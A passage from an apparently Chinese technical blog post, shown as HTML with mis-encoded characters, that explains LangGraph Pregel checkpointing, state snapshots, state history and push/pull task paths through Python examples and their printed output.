IDï¼Œå°±é€‰æ‹©æœ€è¿‘çš„é‚£ä¸€ä¸ªCheckpointçš„IDã€‚</p>\n<p>BaseCheckpointSaverçš„alistæ–¹æ³•ä¼šåˆ—å‡ºå¹¶æ£€ç´¢ä¸æŒ‡å®šæ¡ä»¶åŒ¹é…çš„æ‰€æœ‰CheckpointTupleï¼Œè¿™äº›å…ƒç»„æ„æˆäº†ä¸€æ®µ â€œå†å²â€ ã€‚è¯¥æ–¹æ³•ä¸»è¦ç”¨äºä¼šè¯ç®¡ç†ã€å®¡è®¡å†å²è½¨è¿¹ä»¥åŠçŠ¶æ€å›æº¯ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹çš„å‚æ•°ï¼š</p>\n<ul>\n<li>configï¼šå¦‚æœRunnableConfigå¦‚æœæä¾›äº†Thread IDï¼Œè¯¥æ–¹æ³•å°†ä»…è¿”å›è¯¥ç‰¹å®šçº¿ç¨‹ä¸‹çš„Checkpointã€‚å¦‚æœä¸æä¾›ï¼Œåœ¨æŸäº›å®ç°ä¸­ä¼šåˆ—å‡ºæ‰€æœ‰çº¿ç¨‹çš„æœ€æ–°Checkpointï¼ˆå–å†³äºå…·ä½“çš„å®ç°é€»è¾‘ï¼‰ã€‚</li>\n<li>filterï¼šæä¾›åŸºäºå…ƒæ•°æ®çš„è¿‡æ»¤åŠŸèƒ½ï¼Œä¾‹å¦‚ {\"status\": \"completedâ€} ï¼Œè¿™åœ¨éœ€è¦ç­›é€‰ç‰¹å®šä¸šåŠ¡çŠ¶æ€çš„Checkpointæ—¶éå¸¸æœ‰ç”¨ã€‚</li>\n<li>beforeï¼šä»¥RunnableConfigå¯¹è±¡çš„å½¢å¼æä¾›Checkpoint IDï¼Œè¿”å›åœ¨æ­¤ ä¹‹å‰åˆ›å»ºçš„è®°å½•ã€‚è¿™å¯¹äºå®ç° â€œæ—¶é—´æ—…è¡Œâ€ åŠŸèƒ½è‡³å…³é‡è¦ï¼Œå…è®¸ä½ æŸ¥çœ‹å›¾æ‰§è¡Œå†å²ä¸­çš„æ—§ç‰ˆæœ¬ã€‚</li>\n<li>limitï¼šç”¨äºé™åˆ¶è¿”å›æ•°æ®çš„æ•°é‡ã€‚</li>\n</ul>\n<p>æˆ‘ä»¬é€šè¿‡å¦‚ä¸‹çš„å®ä¾‹æ¼”ç¤ºæ¥è¿›ä¸€æ­¥äº†è§£æŒä¹…åŒ–ã€‚æˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªç”±fooã€bar1å’Œbar2è¿™ä¸‰ä¸ªNodeç»„æˆçš„Pregelï¼Œå¯åŠ¨çš„æ—¶å€™åˆ©ç”¨è¾“å…¥é’ˆå¯¹é€šé“fooçš„å†™å…¥é©±åŠ¨æ‰§è¡ŒèŠ‚ç‚¹fooï¼Œåè€…å®Œæˆåå†™å…¥é€šé“baré©±åŠ¨èŠ‚ç‚¹bar1å’Œbar2å¹¶è¡Œæ‰§è¡Œã€‚ä¸‰ä¸ªNodeçš„å¤„ç†å‡½æ•°éƒ½æ˜¯handleï¼Œå®ƒä¼šå°†ä¼ å…¥çš„Nodeåç§°å†™å…¥ä¸€ä¸ªBinaryOperatorAggregateç±»å‹Channelï¼ˆnodesï¼‰ï¼Œç”±æ­¤ç¡®å®šæˆåŠŸæ‰§è¡Œçš„Nodeã€‚å¦‚æœè°ƒç”¨handleå‡½æ•°å°†interruptå‚æ•°æŒ‡å®šä¸ºTrueï¼Œå®ƒä¼šé€šè¿‡æŠ›å‡ºä¸€ä¸ªGraphInterruptå¼‚å¸¸æ¨¡æ‹Ÿä¸€ä¸ªä¸­æ–­ã€‚åœ¨æˆ‘ä»¬çš„æ¼”ç¤ºå®ä¾‹ä¸­ï¼ŒèŠ‚ç‚¹fooå’Œbar2ä¼šæ‰§è¡ŒæˆåŠŸï¼Œä¸­æ–­ä¼šå‘ç”Ÿåœ¨èŠ‚ç‚¹bar1ä¸Šã€‚</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue, BinaryOperatorAggregate\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.errors import GraphInterrupt\nimport operator, json\n\ndef handle(node_name: str, interrupt: bool = False) -&gt; list[str]:\n    if interrupt:\n        raise GraphInterrupt(\"manual interrupt\")\n    return [node_name]\n\nfoo = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: handle(\"foo\"))\n    .write_to(nodes=lambda x: x, bar=lambda _: \"triggered by foo\")\n)\n\nbar1 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar1\", interrupt=True))\n    .write_to(\"nodes\")\n)\n\nbar2 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar2\", interrupt=False))\n    .write_to(\"nodes\")\n)\n\napp = Pregel(\n    nodes={\"foo\": foo, \"bar1\": bar1, \"bar2\": bar2},\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n        \"nodes\": BinaryOperatorAggregate(list, operator.add),\n    },\n    checkpointer=InMemorySaver(),\n    input_channels=[\"foo\"],\n    output_channels=[\"nodes\"],\n)\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke({\"foo\": \"triggered by user\"}, config=config)\nassert result[\"nodes\"] == [\"foo\", \"bar2\"]\n\n(config, checkpoint, metadata, parent_config, pending_writes) = (\n    app.checkpointer.get_tuple(config)\n)\nprint(f\"config:\\n{json.dumps(config, indent=4)}\")\nprint(f\"checkpoint:\\n{json.dumps(checkpoint, indent=4)}\")\nprint(f\"metadata:\\n{json.dumps(metadata, indent=4)}\")\nprint(f\"parent_config:\\n{json.dumps(parent_config, indent=4)}\")\nprint(f\"pending_writes:\\n{json.dumps(pending_writes, indent=4)}\")\n</code></pre>\n<p>æˆ‘ä»¬ä¸ºåˆ›å»ºçš„Pregelå¯¹è±¡æä¾›äº†ä¸€ä¸ªInMemorySaverä½œä¸ºå®ƒçš„Checkpointerï¼Œå¹¶åœ¨è°ƒç”¨æ—¶åˆ©ç”¨æä¾›çš„RunnableConfigè®¾ç½®äº†Thread IDã€‚ç”±äºæˆ‘ä»¬å°†é€šé“nodesä½œä¸ºè¾“å‡ºï¼Œæ‰€ä»¥è°ƒç”¨ç»“æœä¼šåæ˜ ä¸‰ä¸ªNodeçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆåªæœ‰èŠ‚ç‚¹fooå’Œbar2æˆåŠŸæ‰§è¡Œï¼‰ã€‚æˆ‘ä»¬éšåä¼ å…¥ç›¸åŒçš„é…ç½®è°ƒç”¨Checkpointerçš„get_tupleæ–¹æ³•ï¼Œå¹¶å°†å¾—åˆ°çš„CheckpointTupleå…ƒç»„è¿›è¡Œæ‹†åŒ…è¾“å‡ºã€‚</p>\n<pre><code class=\"language-json\">config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\"\n    }\n}\ncheckpoint:\n{\n    \"v\": 4,\n    \"ts\": \"2026-01-19T10:17:07.498064+00:00\",\n    \"id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\",\n    \"channel_versions\": {\n        \"foo\": \"00000000000000000000000000000001.0.06769883673554666\",\n        \"nodes\": \"00000000000000000000000000000002.0.3174924500871408\",\n        \"bar\": \"00000000000000000000000000000002.0.3174924500871408\"\n    },\n    \"versions_seen\": {\n        \"__input__\": {},\n        \"foo\": {\n            \"foo\": \"00000000000000000000000000000001.0.06769883673554666\"\n        }\n    },\n    \"updated_channels\": [\n        \"bar\",\n        \"nodes\"\n    ],\n    \"channel_values\": {\n        \"foo\": \"triggered by user\",\n        \"nodes\": [\n            \"foo\"\n        ],\n        \"bar\": \"triggered by foo\"\n    }\n}\nmetadata:\n{\n    \"source\": \"loop\",\n    \"step\": 0,\n    \"parents\": {}\n}\nparent_config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24ee-671f-bfff-2e9f3ca91778\"\n    }\n}\npending_writes:\n[\n    [\n        \"30b17cb1-76f1-3c5a-0d32-33f544fcabdf\",\n        \"nodes\",\n        [\n            \"bar2\"\n        ]\n    ],\n    [\n        \"e126d089-c354-0ac8-bb9e-b12bbe3f20b8\",\n        \"__interrupt__\",\n        \"manual interrupt\"\n    ]\n]\n</code></pre>\n<p>æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹æ¶‰åŠä¸‰ä¸ªSuperstepï¼Œä¼šåˆ›å»ºä¸¤ä¸ªCheckpointã€‚ç¬¬ä¸€ä¸ªCheckpointçš„åˆ›å»ºå‘ç”Ÿåœ¨è°ƒç”¨invokeæ–¹æ³•çš„æ—¶å€™ï¼Œæ­¤æ—¶æä¾›çš„è¾“å…¥è¢«å†™å…¥Channelï¼Œé¦–æ‰¹å¾…æ‰§è¡Œçš„Nodeï¼ˆfooï¼‰å‡†å¤‡å°±ç»ªï¼Œæ­¤æ—¶åˆ›å»ºçš„Checkpoint è®°å½•äº† <code>æ¥æ”¶åˆ°äº†åˆå§‹ä»»åŠ¡ï¼Œä½†å°šæœªå¼€å§‹æ‰§è¡Œä»»ä½•Node</code> çš„çŠ¶æ€ã€‚æ­¤æ—¶å¯¹åº”çš„Superstepåºå·ä¸º-1ï¼Œè¾“å‡ºç»“æœçš„parent_configéƒ¨åˆ†æä¾›äº†æ­¤Checkpointçš„IDã€‚</p>\n<p>ç¬¬äºŒä¸ªCheckpointæ˜¯ä¸ºåºå·ä¸º0çš„Superstepåˆ›å»ºçš„ï¼Œæ­¤æ—¶èŠ‚ç‚¹fooæˆåŠŸæ‰§è¡Œï¼Œæ‰§è¡Œç»“æœæœ€ç»ˆè¢«è¾“å…¥ç›®æ ‡Channelï¼Œåˆ›å»ºçš„Checkpointåæ˜ çš„å°±æ˜¯çš„çŠ¶æ€ï¼Œconfigéƒ¨åˆ†æä¾›äº†æ­¤Checkpointçš„IDã€‚ä¸Šé¢çš„è¾“å‡ºè¿˜æä¾›äº†è¿™ä¸ªCheckpointçš„æ—¶é—´æˆ³ã€Channelçš„ç‰ˆæœ¬å’Œå€¼ã€æ¶‰åŠNodeçš„å¯è§Channelï¼ˆfå’Œç‰ˆæœ¬ï¼Œä»¥åŠæ¶‰åŠæ›´æ–°çš„Channelåˆ—è¡¨ã€‚</p>\n<p>ç”±äºæœ€åä¸€ä¸ªSuperstepï¼ˆåºå·ä¸º1ï¼‰æ²¡æœ‰å®Œå…¨ç»“æŸï¼Œå®ƒä»¬ä¼šåˆ©ç”¨å¯¹åº”çš„Pending Writeæ¥æè¿°ã€‚ä¸Šé¢è¾“å‡ºçš„ç¬¬ä¸€ä¸ªPending Writeè¡¨ç¤ºæˆåŠŸæ‰§è¡Œçš„èŠ‚ç‚¹baré’ˆå¯¹é€šé“nodesçš„å†™å…¥ï¼Œç¬¬äºŒä¸ªé’ˆå¯¹ç‰¹æ®Šç³»ç»ŸChannel <code>__interrupt__</code>çš„å†™å…¥å¾ˆæ˜æ˜¾å°±æ˜¯å› ä¸ºèŠ‚ç‚¹bar1çš„ä¸­æ–­å¯¼è‡´ã€‚</p>\n<h2 id=\"2-è¯»å–çŠ¶æ€å¿«ç…§\">2. è¯»å–çŠ¶æ€å¿«ç…§</h2>\n<p>BaseCheckpointSaveræä¾›äº†get_tuple/aget_tupleæ–¹æ³•ä»¥Checkpoint_Tupleçš„å½¢å¼è¿”å›æœ€æ–°æˆ–è€…åŸºäºè¿‡å»æ—¶é—´ç‚¹çš„çŠ¶æ€ã€‚å¯¹äºCheckpointTupleè¿™ä¸ªäº”å…ƒç»„ï¼Œé™¤äº†Checkpointå’ŒPendingWriteåˆ—è¡¨ï¼Œè¿˜åŒ…æ‹¬Checkpointçš„å…ƒæ•°æ®å’Œç›¸å…³é…ç½®ã€‚è¿™ä¸ªå…ƒç»„ä¸»è¦ç”±æ‰§è¡Œå¼•æ“å†…éƒ¨ä½¿ç”¨çš„ï¼Œé’ˆå¯¹æœ€ç»ˆå¼€å‘è€…æ¥è¯´å¯è¯»æ€§å·®ç‚¹ï¼Œæ‰€ä»¥Pregelç±»å®šä¹‰äº†å¦‚ä¸‹æ‰€ç¤ºçš„<code>get_state/aget_state</code>æ–¹æ³•ï¼Œå®ƒä»¬æä¾›çš„StateSnapshotç±»å‹æ›´å…·å¯è¯»æ€§ã€‚</p>\n<pre><code class=\"language-python\">class Pregel(\n    PregelProtocol[StateT, ContextT, InputT, OutputT],\n    Generic[StateT, ContextT, InputT, OutputT]): \n\n    def get_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n    async def aget_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n\n    def get_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[StateSnapshot]\n    async def aget_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[StateSnapshot]\n</code></pre>\n<p>å½“æˆ‘ä»¬è°ƒç”¨Pregelå¯¹è±¡çš„<code>get_state/aget_state</code>æ–¹æ³•çš„æ—¶å€™ï¼Œå®ƒä¼šå°†æŒ‡å®šçš„RunnableConfigå¯¹è±¡ä½œä¸ºå‚æ•°è°ƒç”¨Checkpointerçš„<code>get_tuple/aget_tuple</code>æ–¹æ³•ï¼Œå¹¶åˆ©ç”¨è¿”å›çš„Checkpoint_Tupleå…ƒç»„ç”ŸæˆStateSnapshotå¯¹è±¡ã€‚StateSnapshotçš„<code>values</code>å­—æ®µæä¾›çš„å€¼æ¥æºäºCheckpointå¯¹è±¡çš„channel_valueså­—æ®µï¼Œå®ƒçš„<code>metadata</code>å­—æ®µè¡¨ç¤ºçš„CheckpointMetadata ç›´æ¥æ¥æºäºCheckpoint_Tupleçš„åŒåå­—æ®µï¼Œè€Œ<code>config</code>å’Œ<code>parent_config</code>è¿”å›çš„RunnableConfigåˆ™æ˜¯ç”±Checkpoint_TupleåŒåå­—æ®µäºå…ƒæ•°æ®åˆå¹¶è€Œæˆã€‚è¡¨ç¤ºå¿«ç…§åˆ›å»ºæ—¶é—´çš„<code>created_at</code>å¯¹åº”äºCheckpoint_Tupleè¡¨ç¤ºæ—¶é—´æˆ³çš„tså­—æ®µï¼Œè€Œinterruptsè¿”å›çš„Interruptåˆ—è¡¨æ˜¯æ ¹æ®ä¸­æ–­ç±»å‹çš„PendingWriteæ„å»ºçš„ã€‚</p>\n<pre><code class=\"language-python\">class StateSnapshot(NamedTuple):\n    values: dict[str, Any] | Any\n    next: tuple[str, ...]\n    config: RunnableConfig\n    metadata: CheckpointMetadata | None\n    created_at: str | None\n    parent_config: RunnableConfig | None\n    tasks: tuple[PregelTask, ...]\n    interrupts: tuple[Interrupt, ...]\n\nclass PregelTask(NamedTuple):\n    id: str\n    name: str\n    path: tuple[str | int | tuple, ...]\n    error: Exception | None = None\n    interrupts: tuple[Interrupt, ...] = ()\n    state: None | RunnableConfig | StateSnapshot = None\n    result: Any | None = None\n</code></pre>\n<p>StateSnapshotçš„<code>tasks</code>å­—æ®µè¿”å›ä¸€ç»„PregelTaskå¯¹è±¡ï¼Œå®ƒä»¬è¡¨ç¤ºæ ¹æ®Checkpointåˆ›å»ºçš„å¾…æ‰§è¡Œä»»åŠ¡ï¼Œ<code>next</code>å­—æ®µä»¥å…ƒç»„çš„å½¢å¼è¿”å›è¿™äº›ä»»åŠ¡çš„Nodeåç§°ã€‚å¯¹äºæœ€æ–°çš„Checkpointï¼Œè‹¥ä¸‹ä¸€ä¸ªSuperstepå°šæœªå®Œæˆï¼ŒPregelTaskçš„ä¿¡æ¯è¿˜ä¼šåˆ©ç”¨å¯¹åº”çš„Pending Writeè¿›ä¸€æ­¥å®Œå–„ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨PregelTaskå¯¹è±¡å¾—åˆ°æ¯ä¸ªä»»åŠ¡çš„IDã€Nodeåç§°ã€æ‰§è¡Œè·¯å¾„ã€æŠ›å‡ºçš„å¼‚å¸¸å’Œä¸­æ–­ï¼ˆæ ¹æ®å¼‚å¸¸å’Œä¸­æ–­ç±»å‹çš„PendingWriteåˆ›å»ºï¼‰ï¼Œè€Œ<code>state</code>å’Œ<code>result</code>åˆ†åˆ«æ‰¿è½½è¿™ä»»åŠ¡çš„çŠ¶æ€å’Œè¾“å‡ºç»“æœã€‚å¦‚æœæ•´ä¸ªæ‰§è¡Œæµç¨‹ç»“æŸï¼Œè‡ªç„¶å°±æ²¡æœ‰æ‰€è°“åç»­ä»»åŠ¡çš„è¯´æ³•ï¼Œæ­¤æ—¶StateSnapshotçš„taskså­—æ®µä¸ºç©ºã€‚</p>\n<p>é™¤äº†è¿”å›ä¸€ä¸ªå…·ä½“çš„çŠ¶æ€å¿«ç…§ï¼ŒPregelç±»è¿˜å®šä¹‰äº†<code>get_state_history/aget_state_history</code>ï¼Œå®ƒä»¬çš„å‚æ•°åˆ—è¡¨ä¸BaseCheckpointSaverçš„<code>list/alist</code>æ–¹æ³•å®Œå…¨ä¸€è‡´ã€‚å½“è¿™ä¸¤ä¸ªæ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼ŒPregelä¼šè°ƒç”¨Checkpointerçš„<code>list/alist</code>æ–¹æ³•ï¼Œå¹¶å°†å¾—åˆ°Checkpoint_Tupleå…ƒç»„è½¬æ¢æˆStateSnapshotå¯¹è±¡ã€‚<code>get_state_history/aget_state_history</code>æ–¹æ³•è¿”å›çš„è¿­ä»£å™¨ä»¥æ—¶é—´é€†åºçš„æ–¹å¼è¿”å›å¯¹åº”çš„çŠ¶æ€å¿«ç…§ã€‚</p>\n<p>å¦‚ä¸‹è¿™ä¸ªç¨‹åºæ¼”ç¤ºäº†ä¸€ä¸ªå…·ä½“çš„Pregelå¯¹è±¡çš„å†å²ç”±å“ªäº›å¿«ç…§ç»„æˆï¼Œæ¯ä¸ªå¿«ç…§åˆåæ˜ å½“æ—¶çš„çŠ¶æ€ã€‚æˆ‘ä»¬æ„å»ºçš„Pregelå¯¹è±¡ç”±å››ä¸ªNodeç»„æˆï¼Œè°ƒç”¨æ—¶æŒ‡å®šé€šé“fooä¼šé©±åŠ¨æ‰§è¡ŒèŠ‚ç‚¹fooï¼Œå®ƒæ‰§è¡Œç»“æŸåå†™å…¥é€šé“baré©±åŠ¨bar1ã€bar2å’Œbar3å¹¶è¡Œæ‰§è¡Œã€‚é™¤äº†bar1èƒ½å¤Ÿé¡ºåˆ©æ‰§è¡Œå¤–ï¼Œæˆ‘ä»¬ä¸ºbar2è®¾ç½®äº†ä¸€ä¸ªä¸­æ–­ï¼Œè®©bar3æŠ›å‡ºå¼‚å¸¸ã€‚</p>\n<pre><code class=\"language-python\">from langgraph.channels import LastValue\nfrom langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.checkpoint.memory import  InMemorySaver\nfrom langgraph.types import interrupt\n    \ndef handle(node_name: str, halt : bool, raise_error: bool) -&gt; None:\n    if halt:\n        _ = interrupt(f\"Manually be interrupted at {node_name}\")\n    if raise_error:\n        raise Exception(f\"Manually raised error at {node_name}\")\n\nfoo = (NodeBuilder()\n       .subscribe_to(\"foo\", read=False)\n       .do(lambda _: handle(\"foo\", halt=False, raise_error=False))\n       .write_to(bar = lambda _:None))\nbar1 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar1\", halt=False, raise_error=False)))\nbar2 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar2\", halt=True, raise_error=False)))\nbar3 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar3\", halt=False, raise_error=True)))\napp = Pregel(\n    nodes={\n        \"foo\": foo,\n        \"bar1\": bar1,\n        \"bar2\": bar2,\n        \"bar3\": bar3\n    },\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer= InMemorySaver())\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\n\ntry:\n    app.invoke(input={\"foo\": \"begin\"},config=config)\nexcept Exception as e:\n    pass\n\nfor snapshot in app.get_state_history(config):\n    print(f\"\"\"\nvalues: {snapshot.values}\nnext: {snapshot.next}\ninterrupts: {snapshot.interrupts}   \ntasks:\"\"\")\n    for task in snapshot.tasks:\n        print(f\"\"\"  id: {task.id}\n    name: {task.name}\n    path: {task.path}\n    error: {task.error} \n    interrupts: {task.interrupts}\n    state: {task.state}\n    result: {task.result}\"\"\")\n</code></pre>\n<p>åœ¨å®Œæˆäº†é’ˆå¯¹Pregelå¯¹è±¡çš„è°ƒç”¨åï¼Œæˆ‘ä»¬é‡‡ç”¨ç›¸åŒçš„é…ç½®è°ƒç”¨å®ƒçš„<code>get_state_history</code>æ–¹æ³•å¾—åˆ°å®Œæ•´çš„å†å²ï¼Œå¹¶å°†æ‰¿è½½å†å²ç‰‡æ®µçš„StateSnapshotä¿¡æ¯æ‰“å°å‡ºæ¥ã€‚æ•´ä¸ªè¿‡ç¨‹æ¶‰åŠä¸‰ä¸ªSuperstepï¼Œå‰ä¸¤ä¸ªæˆåŠŸå®Œæˆçš„Superstepä¼šæä¾›ä¸¤ä¸ªCheckpointï¼Œç¬¬ä¸‰ä¸ªå°šæœªå®Œæˆçš„Superstepåªæä¾›é’ˆå¯¹ä¸‰ä¸ªNodeä»»åŠ¡çš„Pending Writeã€‚</p>\n<pre><code class=\"language-json\">values: {'start': 'begin', 'bar': None}\nnext: ('bar1', 'bar2', 'bar3')\ninterrupts: (Interrupt(value='Manually be interrupted at bar2', \n    id='26f309d618c42ff31d2b3404369232e4'),)\ntasks:\n  id: dbb24ec5-f1ba-f845-7351-54e88f34db0f\n    name: bar1\n    path: ('__pregel_pull', 'bar1')\n    error: None\n    interrupts: ()\n    state: None\n    result: {}\n  id: 794fffda-2e6c-0685-0d44-3ed6c57ca366\n    name: bar2\n    path: ('__pregel_pull', 'bar2')\n    error: None\n    interrupts: (Interrupt(value='Manually be interrupted at bar2', \n        id='26f309d618c42ff31d2b3404369232e4'),)\n    state: None\n    result: None\n  id: 1055ec55-49dc-0629-86b5-661a2614f349\n    name: bar3\n    path: ('__pregel_pull', 'bar3')\n    error: Exception('Manually raised error at bar3')\n    interrupts: ()\n    state: None\n    result: None\n\nvalues: {'start': 'begin'}\nnext: ('foo',)\ninterrupts: ()\ntasks:\n  id: 88904475-3edc-733a-d84d-98aa6d3f5e80\n    name: foo\n    path: ('__pregel_pull', 'foo')\n    error: None\n    interrupts: ()\n    state: None\n    result: {'bar': None}\n</code></pre>\n<h2 id=\"3ä»»åŠ¡è·¯å¾„\">3.ä»»åŠ¡è·¯å¾„</h2>\n<p>è¿˜è®°å¾—æˆ‘ä»¬å‰é¢è¯´ä¸ªä»»åŠ¡çš„ä¸¤ç§åˆ›å»ºæ–¹å¼ï¼Œä¸€ç§æ˜¯ç«™åœ¨Nodeçš„è§’åº¦ï¼Œé€šè¿‡æŸ¥çœ‹è®¢é˜…Channelçš„æ›´æ–°çŠ¶æ€ç¡®å®šæ˜¯å¦åº”è¯¥æ‰§è¡Œï¼Œæˆ‘ä»¬ç§°è¿™ç§ä»»åŠ¡åˆ›å»ºæ¨¡å¼ä¸º<code>Pullæ¨¡å¼</code>ã€‚ä¸ä¹‹ç›¸å¯¹çš„åˆ™æ˜¯<code>Pushæ¨¡å¼</code>ï¼ŒNodeåˆ©ç”¨å†™å…¥<code>__pregel_tasks</code>è¿™ä¸ªç‰¹æ®ŠChannelçš„Sendå¯¹è±¡å†³å®šåç»­æ‰§è¡Œçš„Nodeï¼Œæ‰§è¡Œå¼•æ“ä¼šä»æ­¤Channelè¯»å–Sendå¯¹è±¡çš„æ¥åˆ›å»ºå¯¹åº”çš„ä»»åŠ¡ã€‚ä»»åŠ¡è·¯å¾„çš„ç¬¬ä¸€éƒ¨åˆ†é€šå¸¸å°±åæ˜ äº†ä»»åŠ¡çš„é©±åŠ¨æ¨¡å¼ï¼Œå¯¹åº”çš„å€¼ä¸º<code>__pregel_pull</code>å’Œ<code>__pregel_push</code>ã€‚</p>\n<p>ç”±äºå‰é¢æ¼”ç¤ºçš„éƒ½æ˜¯åŸºäºChannelè®¢é˜…é©±åŠ¨çš„ä»»åŠ¡ï¼Œæ‰€ä»¥è·¯å¾„é‡‡ç”¨(â€œ__pregel_pullâ€,{node})çš„å½¢å¼ã€‚å¦‚ä¸‹çš„ç¨‹åºæ¼”ç¤ºâ€œPushä»»åŠ¡â€çš„è·¯å¾„ï¼Œæˆ‘ä»¬æ„å»ºçš„Pregelç”±å››ä¸ªNodeï¼ˆfooã€bar1ã€bar2å’Œbar3ï¼‰ç»„æˆï¼ŒèŠ‚ç‚¹fooçš„å¤„ç†å‡½æ•°æœ€ç»ˆä¼šç”Ÿæˆä¸‰ä¸ªé’ˆå¯¹å…¶ä»–Nodeçš„Sendå¯¹è±¡ï¼Œå¹¶å†™å…¥â€œ__pregel_tasksâ€Channelä»¥é©±åŠ¨å®ƒä»¬å¹¶è¡Œæ‰§è¡Œã€‚</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.pregel._read import PregelNode\nfrom langgraph.pregel._write import ChannelWrite, ChannelWriteTupleEntry\nfrom langgraph.types import Send\nfrom langgraph.checkpoint.memory import InMemorySaver\n\nentry = ChannelWriteTupleEntry(lambda args: [(\"__pregel_tasks\", args)])\nwriter = ChannelWrite(writes=[entry])\nfoo: PregelNode = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: [Send(node=node, arg=\"foo\") for node in [\"bar1\", \"bar2\", \"bar3\"]])\n).build()\nfoo.writers.append(writer)\n\nbars = {name: NodeBuilder() for name in [\"bar1\", \"bar2\", \"bar3\"]}\n\napp = Pregel(\n    nodes={\"foo\": foo, **bars},\n    channels={\n        \"foo\": LastValue(None),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer=InMemorySaver(),\n)\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke(input={\"foo\": None}, config=config, interrupt_before=\"bar2\")\nsnapshot = app.get_state(config)\nfor task in snapshot.tasks:\n    print(f\"{task.name}:{task.path}\")\n</code></pre>\n<p>ä¸ºäº†èƒ½çœ‹åˆ°ä¸‰ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬åœ¨åœ¨æœ€åä¸€ä¸ªSuperstepä¸­äº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼Œä¸ºæ­¤æˆ‘ä»¬åœ¨è°ƒç”¨çš„æ—¶å€™é€šè¿‡æŒ‡å®š<code>interrupt_before</code>å‚æ•°åœ¨æ‰§è¡ŒèŠ‚ç‚¹bar2å‰ä¸­æ–­ã€‚æˆ‘ä»¬éšåè°ƒç”¨Pregelçš„get_stateæ–¹æ³•å¾—åˆ°æè¿°æœ€ç»ˆçŠ¶æ€çš„StateSnapshotï¼Œå¹¶è¾“å‡ºæ‰€æœ‰ä»»åŠ¡çš„æ‰§è¡Œè·¯å¾„ã€‚ä»å¦‚ä¸‹çš„è¾“å‡ºå¯ä»¥çœ‹å‡ºï¼Œç”±äºæ˜¯ä¸‰ä¸ªåŸºäºPushæ¨¡å¼çš„ä»»åŠ¡ï¼Œæ‰€ä»¥ç»„æˆè·¯å¾„çš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†å†…å®¹ä¸º <code>__pregel_push</code> ã€‚æ¯ä¸ªä»»åŠ¡ç”± <code>__pregel_tasks</code> Channelçš„Sendå¯¹è±¡æ„å»ºè€Œæˆï¼Œç¬¬äºŒéƒ¨åˆ†çš„æ•°ç»„ä»£è¡¨å¯¹åº”çš„Sendå¯¹è±¡åœ¨Channelä¸­çš„ç´¢å¼•ã€‚ç”±äºæ•´ä¸ªç¨‹åºåªæœ‰å”¯ä¸€çš„Pregelå¯¹è±¡ï¼Œä¸è®¾ç½®å­å›¾è°ƒç”¨ï¼Œæ‰€ä»¥ç¬¬ä¸‰éƒ¨åˆ†è¿”å›Falseã€‚</p>\n<pre><code>bar1:('__pregel_push', 0, False)\nbar2:('__pregel_push', 1, False)\nbar3:('__pregel_push', 2, False)\n</code></pre>\n<h2 